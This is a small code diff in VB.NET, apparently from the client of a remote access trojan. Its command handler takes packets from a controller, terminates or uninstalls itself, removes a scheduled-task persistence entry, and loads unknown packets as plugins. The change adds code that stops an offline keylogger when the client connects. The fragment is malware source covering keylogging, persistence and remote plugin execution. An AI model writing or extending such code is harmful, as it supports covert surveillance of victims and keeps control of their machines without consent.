@@ -25,14 +25,17 @@ Namespace Client
 				Select Case packet.packetType
 					Case PacketType.CONNECTED
 						StarterClass.clientHandler.baseIp = packet.baseIp
+						If StarterClass.KeylogOn Then
+                            ClientHandler.StopOfflineKeyLogger()
+                        End If
 
 					Case (PacketType.CLOSE_CLIENT)
 						StarterClass.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0)
 
 					Case (PacketType.UNINSTALL_CLOSE_CLIENT)
-						Persistence.TaskScheduler.RemoveTaskScheduler(Config.taskName)
+                        Offline.Persistence.TaskScheduler.RemoveTaskScheduler(Config.taskName)
 
-					Case Else
+                    Case Else
 						pluginDelegateAsync.BeginInvoke(packet, New AsyncCallback(AddressOf EndLoadPlugin), Nothing)
 
 				End Select
